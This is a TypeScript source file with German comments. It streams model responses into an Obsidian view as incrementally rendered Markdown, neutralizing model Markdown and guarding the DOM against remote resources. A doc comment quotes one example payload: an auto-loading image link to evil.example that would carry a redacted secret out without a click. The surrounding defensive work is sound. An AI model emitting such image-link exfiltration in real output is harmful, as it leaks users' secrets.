// vendored from obsidian-kit@0.61.0, src/obsidian/stable-writer.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
import { neutralizeModelMarkdown } from "../kit/safe-markdown";
import { splitStable } from "../kit/stream-blocks";
import type { ClockPort } from "./clock";
import { attachDomGuard, settleWithin, DOM_GUARD_DEADLINE_MS, type DomGuard, type DomGuardOptions } from "./dom-guard";
import type { StreamArea } from "./stream-area";

/**
 * Der inkrementelle Markdown-Schreiber auf einem `StreamArea` (Teil B zu `stream-area.ts`).
 *
 * ## Das Problem, das er löst
 *
 * Eine Antwort, die als Rohtext streamt, zeigt minutenlang Sternchen und Listenstriche.
 * Der naheliegende Ausweg — alle 200 ms den ganzen bisherigen Text neu durch den
 * Markdown-Renderer — ist der falsche: er zeichnet bereits Gezeichnetes neu, flackert,
 * lässt die Scrollposition springen und wächst quadratisch mit der Antwortlänge.
 *
 * Stattdessen: `splitStable` (code-kit) schneidet den Strom an der letzten Absatzgrenze.
 * Was davor liegt, ist fertig und wird **genau einmal** gerendert; der laufende Absatz
 * bleibt Rohtext im Tail, bis er schließt. Der Preis ist bewusst — im laufenden Absatz ist
 * der Text ohnehin unvollständig.
 *
 * ## Warum der Renderer von außen kommt
 *
 * `MarkdownRenderer.render` braucht `App` und eine `Component` als Lebensdauer-Anker. Beides
 * gehört dem Consumer: er weiß, wann seine Ansicht stirbt, das Kit nicht. Deshalb ist
 * `render` ein Callback und keine Kit-Abhängigkeit. Typischer Aufruf:
 *
 * ```ts
 * render: (el, md) => MarkdownRenderer.render(this.app, md, el, "", this.mdComponent)
 * ```
 *
 * ## Wer ihn NICHT braucht
 *
 * Nur die Push-Bauart mit Markdown-Anspruch. Wer Rohtext anhängt oder aus einem Snapshot
 * `slice(-N)` setzt, nimmt `StreamArea` allein — der Schreiber wäre dort Ballast.
 *
 * ## Neutralisierung (Default seit 0.51.0)
 *
 * Jeder Abschnitt geht durch `neutralizeModelMarkdown`, bevor er an `render` geht. Grund: ein
 * Modell-Text läuft sonst durch ALLE Codeblock-Prozessoren des Vaults (```dataviewjs führt Code
 * aus), und Bilder laden von selbst — mit einer Wiederherstellung geschwärzter Werte (`redact`)
 * trüge `![x](https://evil.example/?d=<Original>)` das Geheimnis ohne Klick hinaus. Das ist chunkweise
 * sicher, weil `splitStable` nur außerhalb offener Fences schneidet; die Funktion ist idempotent.
 * Folge für die Darstellung: Codeformatierung in Antworten geht verloren (siehe `safe-markdown`).
 * `raw: true` schaltet das ab — nur mit Begründung im Konsumenten, die dort im Code steht.
 *
 * Grenzen: Der Schreiber deckt nur SEINEN Render-Weg ab. Ein Konsument, der Modell-Text direkt an
 * `MarkdownRenderer` gibt (Hauptansicht, Verlauf, Notiz-Vorschau), ruft `neutralizeModelMarkdown`
 * selbst (das Kit re-exportiert sie). `raw()` liefert den Rohstrom UNneutralisiert — wer ihn
 * rendert oder speichert, neutralisiert vorher. Der Fallback bei einem Render-Fehler setzt den
 * Text per `setText` (Text, kein Markdown) und ist damit unkritisch.
 *
 * ## Zweite Schicht: `domGuard` (Default an seit 0.52.0)
 *
 * Ein `MutationObserver` am Body des Bereichs, für die Lebensdauer des Schreibers, mit
 * `neutralizeRemoteResourcesInTree` im Callback (siehe `dom-guard.ts` für Messung und Restgrenzen). Er wird
 * VOR dem ersten Rendern angehängt und mit `destroy()` getrennt. Sein Wert liegt bei `raw: true` und bei dem,
 * was die Regex-Schicht nicht kennt. Mit Observer wird `render()` nie blind abgewartet: ein entferntes `src`
 * lässt das Versprechen von `MarkdownRenderer.render` hängen, deshalb gilt ein Block nach `renderDeadlineMs`
 * als fertig (das DOM steht). Tests mit dem Fake-DOM übergeben `domGuard: false`.
 *
 * Herkunft: `koda-agent/src/obsidian/view.ts` (`streamToken`, 0.8.0), zweite Fassung
 * `lingotuner/src/obsidian/view.ts:247`.
 */
export interface StableWriterOptions {
  /** Der Bereich, in den geschrieben wird. */
  area: StreamArea;
  /** Rendert Markdown in ein Element. Fehler kosten die Formatierung, nicht den Text. */
  render: (el: HTMLElement, markdown: string) => Promise<void>;
  /** Klasse je stabilem Block. Default `okit-stream-block`. */
  blockCls?: string;
  /** `true` reicht den Roh-Text an `render` (keine Neutralisierung). Nur mit Begründung im Konsumenten. */
  raw?: boolean;
  /** Zweite Schicht gegen Fernquellen (DOM-Observer). Default `true`; `false` nur im Test mit dem Fake-DOM
   *  oder mit Begründung im Konsumenten; ein Objekt reicht `localSchemes`/`onRemoved` durch. */
  domGuard?: boolean | DomGuardOptions;
  /** Frist je Block, solange der Observer hängt; Default `DOM_GUARD_DEADLINE_MS`. Ohne Observer ohne Wirkung. */
  renderDeadlineMs?: number;
  /** Timer für die Frist; Default `realClock`. */
  clock?: ClockPort;
}

export interface StableMarkdownWriter {
  /** Der Bereich, auf dem der Schreiber sitzt. */
  readonly area: StreamArea;
  /** Nächstes Stück des Stroms. Rendert, was dadurch stabil geworden ist. */
  push(text: string): void;
  /** Der gesamte bisherige Rohstrom. */
  raw(): string;
  /** Wartet auf die laufenden Renderings — z. B. um danach zu scrollen, wenn die
   *  endgültige Höhe feststeht. */
  settled(): Promise<void>;
  /** Zurück auf Anfang: Akkumulator, Schnitt-Zeiger **und** der Bereich. Bewusst in einem
   *  Zug — zwei getrennte Resets hätte man irgendwann halb gerufen, und ein zweiter Lauf,
   *  der unter den ersten schreibt, war einer der am 2026-09-07 gemeldeten Fehler. */
  reset(): void;
  /** Nur die Antwort zurücknehmen: Rohstrom, Schnitt-Zeiger, Blöcke und Tail. Die Gedanken des Bereichs bleiben. Für
   *  `onContentReset` des Chat-Clients: Gemma 4 schreibt das Denken ohne Öffner in `content`, und erst das `<channel|>` verrät
   *  es; der Text, der bis dahin als Antwort lief, gehört in den Gedankenblock (den füllt `onReasoning`). Ein Block, der
   *  gerade noch rendert, schreibt ins schon entfernte Element und stört den neuen Text nicht. */
  resetContent(): void;
  /** Trennt den Observer (`domGuard`). Nach dem Abbau der Ansicht rufen; ohne `domGuard` ohne Wirkung. Ein noch rendernder Block
   *  bekommt vorher seinen letzten Durchgang (seit 0.55.0 trennt `destroy()` erst nach `settled()`, wenn noch etwas läuft). */
  destroy(): void;
}

export function createStableWriter(opts: StableWriterOptions): StableMarkdownWriter {
  const { area } = opts;
  const blockCls = opts.blockCls ?? "okit-stream-block";
  let raw = "";
  /** Wie viele Zeichen des Stroms bereits als Markdown gerendert sind. */
  let stableLen = 0;
  let pending: Array<Promise<void>> = [];
  const guardOpts = opts.domGuard === undefined || opts.domGuard === true ? {} : opts.domGuard === false ? null : opts.domGuard;
  const guard: DomGuard | null = guardOpts ? attachDomGuard(area.bodyEl, guardOpts) : null;
  const deadline = opts.renderDeadlineMs ?? DOM_GUARD_DEADLINE_MS;
  // Ein Fehler im vorgezogenen Durchgang darf `push` nicht werfen: der Durchgang NACH dem Rendern läuft ohnehin und fällt
  // bei einem Fehler auf `setText` (fail-closed).
  const flushGuard = (): void => { try { guard?.flush(); } catch { /* siehe oben */ } };

  async function settledAll(): Promise<void> {
    // Ein Rendering kann während des Wartens weitere anstoßen; deshalb bis zur Ruhe.
    while (pending.length > 0) {
      const laufend = pending;
      pending = [];
      await Promise.all(laufend);
    }
  }

  return {
    area,

    push(text: string): void {
      // „Unten?“ wird VOR dem Anfügen gemessen (`withFollow`): ein fertiger Block (Absatz,
      // Tabelle, Code) kommt in einem Zug und kann die Höhe um mehr als die Folge-Schwelle
      // wachsen lassen — nach dem Wachsen gemessen galt der Nutzer als hochgescrollt, der
      // Bereich folgte nach dem ersten Absatz nicht mehr (Welle 20, kuro, 294 und 352 px).
      area.withFollow(() => {
        raw += text;
        const { stable, tail } = splitStable(raw);
        if (stable.length > stableLen) {
          // Nur der NEU stabil gewordene Teil wird gerendert — bereits Gezeichnetes bleibt
          // unangetastet. Das ist der Unterschied zum Voll-Rerender.
          const fresh = stable.slice(stableLen);
          stableLen = stable.length;
          const blockEl = area.bodyEl.createDiv({ cls: blockCls });
          const rendering = opts.render(blockEl, opts.raw ? fresh : neutralizeModelMarkdown(fresh));
          // Der Durchgang steht in DERSELBEN Kette vor dem `catch`: eine Ausnahme darin fällt auf `setText`.
          const p = (guard ? settleWithin(rendering, deadline, opts.clock).then(() => guard.run()) : rendering).catch(() => { blockEl.setText(fresh); });
          pending.push(p);
          // Auch gleich nach dem Anstoßen des Renderns: was dessen synchroner Teil einfügt, wird vor allem Weiteren geprüft.
          flushGuard();
          // Der laufende Absatz gehört immer ans Ende: `createDiv` hängt den frischen Block
          // hinter den Tail, also wandert der Tail danach wieder dahinter.
          area.bodyEl.appendChild(area.tailEl);
        }
        // Vor dem Layout-Lesen (`setTail`): sonst starten die Stil-Quellen, bevor der Observer läuft.
        flushGuard();
        area.setTail(tail);
      });
    },

    raw(): string { return raw; },

    settled: settledAll,

    destroy(): void {
      if (!guard) return;
      // Ein Block, der noch rendert, bekommt seinen letzten Durchgang: der Observer wird erst getrennt, wenn alles durch ist
      // (höchstens die Frist `renderDeadlineMs` später). Der Aufrufer muss die Reihenfolge `settled()` → `destroy()` nicht kennen.
      if (pending.length === 0) { guard.disconnect(); return; }
      void settledAll().finally(() => { guard.disconnect(); });
    },

    resetContent(): void {
      raw = "";
      stableLen = 0;
      area.resetContent();
    },

    reset(): void {
      raw = "";
      stableLen = 0;
      pending = [];
      area.reset();
    },
  };
}
